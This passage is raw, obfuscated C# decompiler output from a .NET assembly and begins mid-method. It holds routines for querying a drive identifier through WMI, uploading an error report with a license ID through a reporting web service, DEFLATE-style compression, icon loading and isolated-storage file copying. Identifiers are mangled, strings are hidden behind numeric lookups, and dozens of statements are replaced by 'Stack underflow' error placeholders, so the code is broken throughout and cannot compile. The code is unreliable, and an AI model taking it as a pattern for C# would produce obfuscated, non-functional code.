			//IL_00f6: Incompatible stack heights: 0 vs 2
			//IL_0100: Incompatible stack heights: 0 vs 1
			//IL_010a: Incompatible stack heights: 0 vs 1
			//IL_0114: Incompatible stack heights: 0 vs 1
			//IL_0126: Incompatible stack heights: 0 vs 1
			//IL_012c: Incompatible stack heights: 0 vs 1
			DriveInfo[] array = default(DriveInfo[]);
			int i = default(int);
			DriveInfo driveInfo = default(DriveInfo);
			string text = default(string);
			try
			{
				_ = global::_0008._0095;
				global::_000E._0003._0001(107396732);
				/*Error near IL_010a: Stack underflow*/((string)/*Error near IL_010a: Stack underflow*/, (string)/*Error near IL_010a: Stack underflow*/);
				if ((int)/*Error near IL_001b: Stack underflow*/ != 0)
				{
					_008F_0003._0084_0006();
					array = (DriveInfo[])/*Error near IL_011a: Stack underflow*/;
					if (uint.MaxValue != 0)
					{
						i = 0;
					}
					for (; i < array.Length; i++)
					{
						driveInfo = (DriveInfo)((object[])/*Error near IL_003f: Stack underflow*/)[/*Error near IL_003f: Stack underflow*/];
						if (_008D._007E_007F_0003(driveInfo))
						{
							P_0 = global::_0007._007E_0086(_0090_0003._007E_0086_0006(driveInfo));
							break;
						}
					}
				}
				if (_000E_0002._007E_0015_0004(P_0, global::_000E._0003._0001(107391820)))
				{
					P_0 = _001C._007E_009B_0002(P_0, 0, global::_0001._007E_0001(P_0) - 2);
				}
				global::_000F obj = global::_000F._007E_0010_0002;
				ManagementObject val = new ManagementObject(_0019._0098_0002(global::_000E._0003._0001(107391815), P_0, global::_000E._0003._0001(107391806)));
				val.Get();
				text = ((ManagementBaseObject)val).get_Item(global::_000E._0003._0001(107391801)).ToString();
				obj((object)val);
				return text;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)text, (object)array, (object)i, (object)driveInfo, (object)P_0);
				throw;
			}
		}

		static void _0001(global::_0001._0006 P_0, string P_1, string P_2, global::_0006._0008 P_3, string P_4, byte[] P_5)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 2
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0061: Incompatible stack heights: 0 vs 1
			ReportingService1 reportingService = default(ReportingService1);
			Exception ex2 = default(Exception);
			try
			{
				try
				{
					new ReportingService1(((global::_0006._0008)/*Error near IL_0007: Stack underflow*/)._0003);
					reportingService = (ReportingService1)/*Error near IL_004b: Stack underflow*/;
					if (((global::_0006._0008)/*Error near IL_0012: Stack underflow*/)._0001 != null)
					{
						_ = _0096_0002._007E_0081_0005;
						IWebProxy webProxy = ((global::_0006._0008)/*Error near IL_0022: Stack underflow*/)._0001;
						/*Error near IL_005b: Stack underflow*/((object)/*Error near IL_005b: Stack underflow*/, webProxy);
					}
					string licenseID = P_3._0002;
					string text = ((ReportingService1)/*Error near IL_0039: Stack underflow*/).UploadReport2(licenseID, P_5, P_4, P_1, P_2);
					/*Error near IL_003e: Stack underflow*/(text);
				}
				catch (Exception ex)
				{
					ex2 = ex;
					P_0(global::_0004._0019(global::_000E._0003._0001(107392684), global::_0007._007E_008D(ex2)));
				}
			}
			catch (Exception ex3)
			{
				_0011._0001(ex3, (object)reportingService, (object)ex2, (object)P_3, (object)P_5, (object)P_4, (object)P_1, (object)P_2, (object)P_0);
				throw;
			}
		}

		static void _0001(uint P_0)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			IDisposable disposable = default(IDisposable);
			try
			{
				disposable = null;
				try
				{
					if (0 == 0)
					{
						if (0 == 0)
						{
							_0011._0001();
							disposable = (IDisposable)/*Error near IL_0029: Stack underflow*/;
						}
						if (0 == 0 && 0 == 0)
						{
							_ = /*Error near IL_0017: Stack underflow*/* 8;
						}
						_0011._0001((long)(ulong)/*Error near IL_0018: Stack underflow*/, global::_0002._000E._0002);
					}
				}
				catch (Exception)
				{
				}
				finally
				{
					if (0 == 0 && disposable != null)
					{
						global::_000F._007E_0099(disposable);
					}
				}
			}
			catch (Exception ex2)
			{
				_0011._0001(ex2, (object)disposable, (object)P_0);
				throw;
			}
		}

		static bool _0001(global::_0002._0006._0003 P_0, global::_0002._0006 P_1, byte[] P_2)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 1
			//IL_00c5: Incompatible stack heights: 0 vs 1
			//IL_00d1: Incompatible stack heights: 0 vs 1
			//IL_00d7: Incompatible stack heights: 0 vs 1
			try
			{
				_0011._0001((byte[])/*Error near IL_0010: Stack underflow*/);
				byte[] array = (byte[])/*Error near IL_0013: Stack underflow*/;
			}
			catch (Exception)
			{
				_0011._0001(P_1, global::_000E._0005._0001, global::_0008._0004._0001);
				return false;
			}
			global::_000E._0003._0001(107394327);
			_0011._0001((byte[])/*Error near IL_00c5: Stack underflow*/, (string)/*Error near IL_00c5: Stack underflow*/);
			byte[] array2 = (byte[])/*Error near IL_00cb: Stack underflow*/;
			if ((int)/*Error near IL_004a: Stack underflow*/ == 0)
			{
				string text = global::_000E._0004._0001;
				_0011._0001((global::_0002._0006)/*Error near IL_005a: Stack underflow*/, global::_000E._0005._0001, text);
				return false;
			}
			if (0 == 0)
			{
				_0011._0001(P_1, global::_000E._0005._0002);
				global::_0002._0007 obj = new global::_0002._0007(global::_000E._0003._0001(107392009));
				if (P_1._0001 != null)
				{
					obj._0001 = P_1._0001;
				}
				global::_0002._0006._0001 obj2 = new global::_0002._0006._0001(P_1, array2, obj, P_0);
				_0011._0001(obj, (global::_0004._0006)obj2._0001);
				return obj2._0001;
			}
			bool result;
			return result;
		}

		static _000E _0001()
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			IDisposable disposable = default(IDisposable);
			_000E obj = default(_000E);
			try
			{
				while (true)
				{
					_0011._0001();
					if (4u != 0)
					{
						disposable = (IDisposable)/*Error near IL_004a: Stack underflow*/;
					}
					try
					{
						_0011._0001();
						_0011._0001();
						if (0 == 0)
						{
							obj = (_000E)/*Error near IL_001f: Stack underflow*/;
						}
					}
					finally
					{
						if (disposable != null && 0 == 0)
						{
							global::_000F._007E_0099(disposable);
						}
					}
					while (7u != 0)
					{
						_000E obj2 = (_000E)/*Error near IL_0050: Stack underflow*/;
						if (0 == 0 && 0 == 0)
						{
							goto end_IL_0042;
						}
					}
					continue;
					end_IL_0042:
					break;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)disposable, (object)obj);
				throw;
			}
			return (_000E)/*Error near IL_005e: Stack underflow*/;
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3, object P_4, object P_5, object P_6)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 4
			//IL_0030: Incompatible stack heights: 0 vs 3
			//IL_0033: Incompatible stack heights: 0 vs 3
			//IL_0037: Incompatible stack heights: 0 vs 3
			//IL_003b: Incompatible stack heights: 0 vs 3
			//IL_003f: Incompatible stack heights: 0 vs 3
			_ = new object[6];
			_ = 0;
			((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_000d: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/] = (object)/*Error near IL_0012: Stack underflow*/;
			/*Error near IL_0012: Stack underflow*/;
			_ = 2;
			((object[])/*Error near IL_0017: Stack underflow*/)[/*Error near IL_0017: Stack underflow*/] = (object)/*Error near IL_0017: Stack underflow*/;
			/*Error near IL_0017: Stack underflow*/;
			_ = 3;
			((object[])/*Error near IL_001c: Stack underflow*/)[/*Error near IL_001c: Stack underflow*/] = (object)/*Error near IL_001c: Stack underflow*/;
			/*Error near IL_001c: Stack underflow*/;
			_ = 4;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = (object)/*Error near IL_0021: Stack underflow*/;
			/*Error near IL_0021: Stack underflow*/;
			_ = 5;
			((object[])/*Error near IL_0026: Stack underflow*/)[/*Error near IL_0026: Stack underflow*/] = (object)/*Error near IL_0026: Stack underflow*/;
			_0011._0001((Exception)/*Error near IL_0046: Stack underflow*/, (object[])/*Error near IL_0046: Stack underflow*/);
		}

		unsafe static void _0001(int P_0, byte[] P_1, int P_2, bool P_3, global::_0008._0004._0007 P_4)
		{
			//IL_027d: Incompatible stack heights: 0 vs 1
			//IL_0284: Incompatible stack heights: 0 vs 1
			//IL_0295: Incompatible stack heights: 0 vs 1
			//IL_02a6: Incompatible stack heights: 0 vs 1
			//IL_02b4: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[24];
			try
			{
				((global::_0008._0004._0007)/*Error near IL_0014: Stack underflow*/)._0001._0001[256]++;
				_0011._0001(((global::_0008._0004._0007)/*Error near IL_0033: Stack underflow*/)._0001);
				global::_0008._0004._0007._0001 obj = ((global::_0008._0004._0007)/*Error near IL_0042: Stack underflow*/)._0002;
				if (0 == 0)
				{
					_0011._0001(obj);
				}
				global::_0008._0004._0007._0001 obj2 = ((global::_0008._0004._0007)/*Error near IL_0053: Stack underflow*/)._0001;
				global::_0008._0004._0007._0001 obj3 = ((global::_0008._0004._0007)/*Error near IL_0062: Stack underflow*/)._0003;
				_0011._0001(obj3, obj2);
				obj2 = P_4._0002;
				obj3 = P_4._0003;
				_0011._0001(obj3, obj2);
				_0011._0001(P_4._0003);
				*(int*)ptr = 4;
				*(int*)((byte*)ptr + 12) = 18;
				while (*(int*)((byte*)ptr + 12) > *(int*)ptr)
				{
					if (P_4._0003._0001[global::_0008._0004._0007._0001[*(int*)((byte*)ptr + 12)]] > 0)
					{
						*(int*)ptr = *(int*)((byte*)ptr + 12) + 1;
					}
					(*(int*)((byte*)ptr + 12))--;
				}
				*(int*)((byte*)ptr + 4) = 14 + *(int*)ptr * 3 + _0011._0001(P_4._0003) + _0011._0001(P_4._0001) + _0011._0001(P_4._0002) + P_4._0002;
				*(int*)((byte*)ptr + 8) = P_4._0002;
				*(int*)((byte*)ptr + 16) = 0;
				while (*(int*)((byte*)ptr + 16) < 286)
				{
					*(int*)((byte*)ptr + 8) += P_4._0001._0001[*(int*)((byte*)ptr + 16)] * global::_0008._0004._0007._0003[*(int*)((byte*)ptr + 16)];
					(*(int*)((byte*)ptr + 16))++;
				}
				*(int*)((byte*)ptr + 20) = 0;
				while (*(int*)((byte*)ptr + 20) < 30)
				{
					*(int*)((byte*)ptr + 8) += P_4._0002._0001[*(int*)((byte*)ptr + 20)] * global::_0008._0004._0007._0004[*(int*)((byte*)ptr + 20)];
					(*(int*)((byte*)ptr + 20))++;
				}
				if (*(int*)((byte*)ptr + 4) >= *(int*)((byte*)ptr + 8))
				{
					*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
				}
				if (P_0 >= 0 && P_2 + 4 < *(int*)((byte*)ptr + 4) >> 3)
				{
					_0011._0001(P_0, P_4, P_1, P_3, P_2);
				}
				else if (*(int*)((byte*)ptr + 4) == *(int*)((byte*)ptr + 8))
				{
					_0011._0001(P_4._0001, 2 + (P_3 ? 1 : 0), 3);
					global::_0008._0004._0007._0001 obj4 = P_4._0001;
					short[] array = global::_0008._0004._0007._0002;
					byte[] array2 = global::_0008._0004._0007._0003;
					_0011._0001(array2, array, obj4);
					obj4 = P_4._0002;
					array = global::_0008._0004._0007._0003;
					array2 = global::_0008._0004._0007._0004;
					_0011._0001(array2, array, obj4);
					_0011._0001(P_4);
					_0011._0001(P_4);
				}
				else
				{
					_0011._0001(P_4._0001, 4 + (P_3 ? 1 : 0), 3);
					_0011._0001(*(int*)ptr, P_4);
					_0011._0001(P_4);
					_0011._0001(P_4);
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, new object[11]
				{
					*(int*)ptr,
					*(int*)((byte*)ptr + 4),
					*(int*)((byte*)ptr + 8),
					*(int*)((byte*)ptr + 12),
					*(int*)((byte*)ptr + 16),
					*(int*)((byte*)ptr + 20),
					P_4,
					P_1,
					P_0,
					P_2,
					P_3
				});
				throw;
			}
		}

		static string _0001(Version P_0)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			OsInformation._0095_0003_009E_0006((Version)/*Error near IL_000d: Stack underflow*/);
			return (string)/*Error near IL_0005: Stack underflow*/;
		}

		static int _0001(global::_0008._0004._000F P_0)
		{
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			try
			{
				if (4u != 0)
				{
					((Stream)/*Error near IL_0020: Stack underflow*/).ReadByte();
					do
					{
						((Stream)/*Error near IL_002a: Stack underflow*/).ReadByte();
						do
						{
							_ = /*Error near IL_000d: Stack underflow*/<< 8;
						}
						while (false);
						_ = /*Error near IL_0011: Stack underflow*/| /*Error near IL_0011: Stack underflow*/;
					}
					while (false);
					int num = (int)/*Error near IL_002d: Stack underflow*/;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
			return (int)/*Error near IL_003a: Stack underflow*/;
		}

		unsafe static bool _0001(global::_0008._0004._0001 P_0)
		{
			//IL_0238: Incompatible stack heights: 0 vs 1
			//IL_0242: Incompatible stack heights: 0 vs 1
			//IL_024e: Incompatible stack heights: 0 vs 1
			//IL_0254: Incompatible stack heights: 0 vs 1
			//IL_025a: Incompatible stack heights: 0 vs 1
			//IL_0260: Incompatible stack heights: 0 vs 1
			//IL_0266: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[13];
			int num = default(int);
			int num3 = default(int);
			try
			{
				while (true)
				{
					IL_000f:
					_0011._0001(((global::_0008._0004._0001)/*Error near IL_0014: Stack underflow*/)._0001);
					num = (int)/*Error near IL_0248: Stack underflow*/;
					while (true)
					{
						if (num >= 258)
						{
							int num2 = ((global::_0008._0004._0001)/*Error near IL_0032: Stack underflow*/)._0001;
							*(int*)(nint)/*Error near IL_0033: Stack underflow*/ = num2;
							int num4;
							int num5;
							switch (*(int*)(nint)/*Error near IL_0039: Stack underflow*/)
							{
							case 7:
								while (true)
								{
									num4 = (num3 = _0011._0001(P_0._0001, P_0._0001));
									if (0 == 0)
									{
										if (((uint)num4 & 0xFFFFFF00u) != 0)
										{
											break;
										}
										_ = ((global::_0008._0004._0001)/*Error near IL_005f: Stack underflow*/)._0001;
										_0011._0001((global::_0008._0004._0003)/*Error near IL_0069: Stack underflow*/, (int)/*Error near IL_0069: Stack underflow*/);
										num4 = --num;
									}
									num5 = 258;
									if (num5 != 0)
									{
										if (num4 < num5)
										{
											((byte*)ptr)[12] = 1;
											goto end_IL_0224;
										}
										continue;
									}
									goto IL_0108;
								}
								if (num3 < 257)
								{
									if (num3 < 0)
									{
										((byte*)ptr)[12] = 0;
										goto end_IL_0224;
									}
									P_0._0002 = null;
									P_0._0001 = null;
									P_0._0001 = 2;
									((byte*)ptr)[12] = 1;
									goto end_IL_0224;
								}
								P_0._0003 = global::_0008._0004._0001._0001[num3 - 257];
								P_0._0002 = global::_0008._0004._0001._0002[num3 - 257];
								goto case 8;
							case 8:
								num4 = P_0._0002;
								num5 = 0;
								goto IL_0108;
							case 9:
								num3 = _0011._0001(P_0._0002, P_0._0001);
								if (num3 < 0)
								{
									((byte*)ptr)[12] = 0;
									goto end_IL_0224;
								}
								P_0._0004 = global::_0008._0004._0001._0003[num3];
								P_0._0002 = global::_0008._0004._0001._0004[num3];
								break;
							case 10:
								break;
							default:
								continue;
								IL_0108:
								if (num4 > num5)
								{
									P_0._0001 = 8;
									*(int*)((byte*)ptr + 4) = _0011._0001(P_0._0001, P_0._0002);
									if (*(int*)((byte*)ptr + 4) < 0)
									{
										((byte*)ptr)[12] = 0;
										goto end_IL_0224;
									}
									_0011._0001(P_0._0001, P_0._0002);
									P_0._0003 += *(int*)((byte*)ptr + 4);
								}
								P_0._0001 = 9;
								goto case 9;
							}
							if (P_0._0002 > 0)
							{
								P_0._0001 = 10;
								*(int*)((byte*)ptr + 8) = _0011._0001(P_0._0001, P_0._0002);
								if (*(int*)((byte*)ptr + 8) < 0)
								{
									if (false)
									{
										goto IL_000f;
									}
									((byte*)ptr)[12] = 0;
									break;
								}
								_0011._0001(P_0._0001, P_0._0002);
								P_0._0004 += *(int*)((byte*)ptr + 8);
							}
							_0011._0001(P_0._0001, P_0._0003, P_0._0004);
							num -= P_0._0003;
							P_0._0001 = 7;
							continue;
						}
						((byte*)ptr)[12] = 1;
						break;
						continue;
						end_IL_0224:
						break;
					}
					break;
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)num, (object)num3, (object)(*(int*)ptr), (object)(*(int*)((byte*)ptr + 4)), (object)(*(int*)((byte*)ptr + 8)), (object)P_0);
				throw;
			}
			return ((byte*)ptr)[12] != 0;
		}

		static Exception _0001(global::_0007._0002 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0007._0002)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3, object P_4, object P_5, object P_6, object P_7)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 4
			//IL_0035: Incompatible stack heights: 0 vs 3
			//IL_0038: Incompatible stack heights: 0 vs 3
			//IL_003c: Incompatible stack heights: 0 vs 3
			//IL_0040: Incompatible stack heights: 0 vs 3
			//IL_0044: Incompatible stack heights: 0 vs 3
			//IL_0048: Incompatible stack heights: 0 vs 3
			_ = new object[7];
			_ = 0;
			((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_000d: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/] = (object)/*Error near IL_0012: Stack underflow*/;
			/*Error near IL_0012: Stack underflow*/;
			_ = 2;
			((object[])/*Error near IL_0017: Stack underflow*/)[/*Error near IL_0017: Stack underflow*/] = (object)/*Error near IL_0017: Stack underflow*/;
			/*Error near IL_0017: Stack underflow*/;
			_ = 3;
			((object[])/*Error near IL_001c: Stack underflow*/)[/*Error near IL_001c: Stack underflow*/] = (object)/*Error near IL_001c: Stack underflow*/;
			/*Error near IL_001c: Stack underflow*/;
			_ = 4;
			((object[])/*Error near IL_0021: Stack underflow*/)[/*Error near IL_0021: Stack underflow*/] = (object)/*Error near IL_0021: Stack underflow*/;
			/*Error near IL_0021: Stack underflow*/;
			_ = 5;
			((object[])/*Error near IL_0026: Stack underflow*/)[/*Error near IL_0026: Stack underflow*/] = (object)/*Error near IL_0026: Stack underflow*/;
			/*Error near IL_0026: Stack underflow*/;
			_ = 6;
			((object[])/*Error near IL_002b: Stack underflow*/)[/*Error near IL_002b: Stack underflow*/] = (object)/*Error near IL_002b: Stack underflow*/;
			_0011._0001((Exception)/*Error near IL_004f: Stack underflow*/, (object[])/*Error near IL_004f: Stack underflow*/);
		}

		static global::_000E._0005 _0001(_0007 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static Icon _0001(string P_0)
		{
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0044: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0089._007E_000F_0003;
				_0088._000E_0003();
				_ = _0019._0098_0002;
				global::_000E._0003._0001(107391744);
				global::_000E._0003._0001(107391171);
				/*Error near IL_0055: Stack underflow*/((string)/*Error near IL_0055: Stack underflow*/, (string)/*Error near IL_0055: Stack underflow*/, (string)/*Error near IL_0055: Stack underflow*/);
				/*Error near IL_005c: Stack underflow*/((object)/*Error near IL_005c: Stack underflow*/, (string)/*Error near IL_005c: Stack underflow*/);
				Stream stream = (Stream)/*Error near IL_005f: Stack underflow*/;
				return ((int)/*Error near IL_002b: Stack underflow*/ == 0) ? ((Icon)null) : new Icon((Stream)/*Error near IL_0032: Stack underflow*/);
			}
			catch
			{
				return null;
			}
		}

		static Exception _0001(_0006 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0006)/*Error near IL_0007: Stack underflow*/)._0001;
		}

		static bool _0001(_0006 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0006)/*Error near IL_0007: Stack underflow*/)._0002;
		}

		static int _0001(string P_0, Graphics P_1, Font P_2, int P_3)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 2
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			try
			{
				if (0 == 0)
				{
					_0011._0001((string)/*Error near IL_0022: Stack underflow*/, (Graphics)/*Error near IL_0022: Stack underflow*/, (Font)/*Error near IL_0022: Stack underflow*/, (int)/*Error near IL_0022: Stack underflow*/);
					return (int)/*Error near IL_0024: Stack underflow*/;
				}
				int result;
				return result;
			}
			catch (Exception)
			{
				try
				{
					int result;
					do
					{
						_ = _0092_0003._0089_0006;
						int num = _0011._0001((Font)/*Error near IL_0039: Stack underflow*/, (int)/*Error near IL_0039: Stack underflow*/, (Graphics)/*Error near IL_0039: Stack underflow*/, P_0);
						result = /*Error near IL_0049: Stack underflow*/((double)num * 1.1);
					}
					while (false);
					return result;
				}
				catch (Exception)
				{
				}
			}
			return 0;
		}

		static void _0001()
		{
			//IL_00a7: Incompatible stack heights: 0 vs 5
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 1
			//IL_00cd: Incompatible stack heights: 0 vs 1
			//IL_00d3: Incompatible stack heights: 0 vs 1
			string[] array = default(string[]);
			int i = default(int);
			string text = default(string);
			string text2 = default(string);
			try
			{
				do
				{
					_0011._0001(global::_0002._000E._0002);
					try
					{
						_ = _0093_0003._007E_008A_0006;
						_ = global::_0002._000E._0001;
						_ = global::_0004._001A;
						_ = global::_0002._000E._0003;
						global::_000E._0003._0001(107391194);
						/*Error near IL_00b1: Stack underflow*/((string)/*Error near IL_00b1: Stack underflow*/, (string)/*Error near IL_00b1: Stack underflow*/);
						/*Error near IL_00bb: Stack underflow*/((object)/*Error near IL_00bb: Stack underflow*/, (string)/*Error near IL_00bb: Stack underflow*/);
						array = (string[])/*Error near IL_00c1: Stack underflow*/;
						for (i = 0; i < array.Length; i++)
						{
							text = (string)((object[])/*Error near IL_0047: Stack underflow*/)[/*Error near IL_0047: Stack underflow*/];
							text2 = global::_0006._001F(text);
							_0011._0001(global::_0004._001A(global::_0002._000E._0003, text));
							_0011._0001(global::_0004._001A(global::_0002._000E._0003, global::_0004._0019(text2, global::_000E._0003._0001(107396618))));
						}
					}
					catch (DirectoryNotFoundException)
					{
					}
					try
					{
						do
						{
							global::_0011._007E_0083_0002(global::_0002._000E._0001, global::_0002._000E._0003);
						}
						while (2 == 0);
					}
					catch (IsolatedStorageException)
					{
					}
				}
				while (6 == 0);
				global::_0011._007E_0084_0002(global::_0002._000E._0001, global::_0002._000E._0003);
			}
			catch (Exception ex3)
			{
				_0011._0001(ex3, (object)array, (object)i, (object)text, (object)text2);
				throw;
			}
		}

		static void _0001(Exception P_0, object P_1, object P_2, object P_3)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 4
			//IL_0021: Incompatible stack heights: 0 vs 3
			//IL_0024: Incompatible stack heights: 0 vs 3
			_ = new object[3];
			_ = 0;
			((object[])/*Error near IL_000d: Stack underflow*/)[/*Error near IL_000d: Stack underflow*/] = (object)/*Error near IL_000d: Stack underflow*/;
			/*Error near IL_000d: Stack underflow*/;
			_ = 1;
			((object[])/*Error near IL_0012: Stack underflow*/)[/*Error near IL_0012: Stack underflow*/] = (object)/*Error near IL_0012: Stack underflow*/;
			/*Error near IL_0012: Stack underflow*/;
			_ = 2;
			((object[])/*Error near IL_0017: Stack underflow*/)[/*Error near IL_0017: Stack underflow*/] = (object)/*Error near IL_0017: Stack underflow*/;
			_0011._0001((Exception)/*Error near IL_002b: Stack underflow*/, (object[])/*Error near IL_002b: Stack underflow*/);
		}

		static void _0001(global::_0008._0004._0008 P_0)
		{
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Expected I4, but got Unknown
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_0039: Incompatible stack heights: 0 vs 2
			try
			{
				_ = ((global::_0008._0004._0008)/*Error near IL_0009: Stack underflow*/)._0001;
				int num = ((global::_0008._0004._0008)/*Error near IL_0010: Stack underflow*/)._0005;
				_ = ((byte[])/*Error near IL_0011: Stack underflow*/)[num] << 5;
				_ = ((global::_0008._0004._0008)/*Error near IL_001a: Stack underflow*/)._0001;
				int num2 = ((global::_0008._0004._0008)/*Error near IL_0021: Stack underflow*/)._0005;
				byte num3 = ((byte[])/*Error near IL_0024: Stack underflow*/)[num2 + 1];
				_003F val = /*Error near IL_0025: Stack underflow*/^ num3;
				((global::_0008._0004._0008)/*Error near IL_002a: Stack underflow*/)._0001 = (int)val;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)P_0);
				throw;
			}
		}

		static void _0001(int P_0, string P_1)
		{
			//IL_001e: Incompatible stack heights: 0 vs 2
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 2
			object obj = default(object);
			try
			{
				try
				{
					obj = global::_000E._0003._0001;
					_ = _0092_0002._001B_0005;
					/*Error near IL_0043: Stack underflow*/((object)/*Error near IL_0043: Stack underflow*/);
					try
					{
						_ = global::_000E._0003._0001;
						((Dictionary<int, string>)/*Error near IL_0028: Stack underflow*/).Add((int)/*Error near IL_0028: Stack underflow*/, (string)/*Error near IL_0028: Stack underflow*/);
					}
					finally
					{
						_0092_0002._001C_0005(obj);
					}
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, obj, (object)P_0, (object)P_1);
				throw;
			}
		}

		static void _0001(global::_0004._0001 P_0)
		{
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 2
			//IL_0068: Incompatible stack heights: 0 vs 1
			string text = default(string);
			string text2 = default(string);
			string text3 = default(string);
			try
			{
				while (true)
				{
					_0011._0001();
					text = (string)/*Error near IL_004b: Stack underflow*/;
					_0011._0001();
					text2 = (string)/*Error near IL_0055: Stack underflow*/;
					if (2 == 0)
					{
						continue;
					}
					_0011._0001();
					text3 = (string)/*Error near IL_005f: Stack underflow*/;
					while (true)
					{
						_ = global::_0004._0019;
						string text4 = /*Error near IL_0022: Stack underflow*/((string)/*Error near IL_0022: Stack underflow*/, (string)/*Error near IL_0022: Stack underflow*/);
						((global::_0004._0001)/*Error near IL_0027: Stack underflow*/)._0001 = text4;
						P_0._0002 = global::_0004._0019(P_0._0001, text3);
						if (0 == 0)
						{
							return;
						}
					}
				}
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)text, (object)text2, (object)text3, (object)P_0);
				throw;
			}
		}

		static string _0001()
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			try
			{
				_0011._0001();
				string text = (string)/*Error near IL_000e: Stack underflow*/;
			}
			catch (Exception ex)
			{
				_0011._0001(ex);
				throw;
			}
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		static void _0001(global::_0002._0006 P_0, IWebProxy P_1)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			((global::_0002._0006)/*Error near IL_0009: Stack underflow*/)._0001 = (IWebProxy)/*Error near IL_0009: Stack underflow*/;
		}

		static string _0001()
		{
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			_ = global::_0004._0019;
			global::_000E._0003._0001(107391185);
			global::_000E._0002._0001();
